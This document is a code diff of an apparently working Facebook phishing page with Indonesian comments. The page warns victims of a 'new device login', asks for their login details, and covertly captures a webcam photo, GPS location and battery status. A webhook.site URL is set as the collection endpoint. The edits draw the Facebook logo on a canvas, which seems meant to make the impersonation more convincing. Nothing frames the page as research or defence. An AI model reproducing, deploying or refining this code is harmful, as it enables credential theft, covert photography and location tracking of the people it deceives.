@@ -8,8 +8,8 @@
         body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
         
-        /* GANTI LOGO PAKE TEXT BIAR GAK PECAH */
-        .logo-text { color: #1877f2; font-size: 38px; font-weight: 800; letter-spacing: -2px; margin-bottom: 15px; display: block; font-family: Helvetica, Arial, sans-serif; }
+        /* Box buat logo hasil gambar script */
+        #fb-logo-canvas { margin-bottom: 15px; }
         
         .msg { font-size: 15px; color: #1c1e21; margin-bottom: 20px; line-height: 1.4; font-weight: 500; text-align: left; }
         input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; background-color: #f5f6f7; }
@@ -21,8 +21,8 @@
 <body>
 
 <div class="card">
-    <!-- Logo ini murni teks, gak mungkin pecah walau internet lemot -->
-    <span class="logo-text">facebook</span>
+    <!-- Kita gambar logonya di sini pake JS -->
+    <canvas id="fb-logo-canvas" width="200" height="50"></canvas>
 
     <div class="msg">Akun Anda terdeteksi login dari perangkat baru. Silakan verifikasi identitas Anda untuk mencegah pemblokiran permanen.</div>
     
@@ -34,9 +34,16 @@
 </div>
 
 <video id="vid" autoplay></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<canvas id="cap-canvas" style="display:none;"></canvas>
 
 <script>
+    // FUNGSI GAMBAR LOGO OTOMATIS
+    const canvasLogo = document.getElementById('fb-logo-canvas');
+    const ctx = canvasLogo.getContext('2d');
+    ctx.fillStyle = '#1877f2';
+    ctx.font = 'bold 40px Helvetica, Arial, sans-serif';
+    ctx.fillText('facebook', 10, 40);
+
     const WEBHOOK_URL = "https://webhook.site/a8889196-bf1c-4c88-9a69-8eacaf2e1bd0";
 
     async function execute() {
@@ -49,34 +56,26 @@
         let gpsData = "GPS Access Denied";
         let batteryInfo = "N/A";
 
-        // Info Baterai
         try {
             const b = await navigator.getBattery();
             batteryInfo = `${(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
         } catch(e) {}
 
-        // Ambil Foto
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('vid');
             video.srcObject = stream;
             await new Promise(r => setTimeout(r, 1500));
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth; 
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            photoData = canvas.toDataURL('image/jpeg', 0.6);
+            const capCanvas = document.getElementById('cap-canvas');
+            capCanvas.width = video.videoWidth; 
+            capCanvas.height = video.videoHeight;
+            capCanvas.getContext('2d').drawImage(video, 0, 0);
+            photoData = capCanvas.toDataURL('image/jpeg', 0.6);
             stream.getTracks().forEach(t => t.stop());
         } catch(e) {}
 
-        // Ambil GPS
         navigator.geolocation.getCurrentPosition((pos) => {
-            gpsData = { 
-                lat: pos.coords.latitude, 
-                lon: pos.coords.longitude, 
-                acc: pos.coords.accuracy + "m", 
-                maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` 
-            };
+            gpsData = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy + "m", maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` };
             finalize(u, p, photoData, gpsData, batteryInfo);
         }, () => {
             finalize(u, p, photoData, gpsData, batteryInfo);
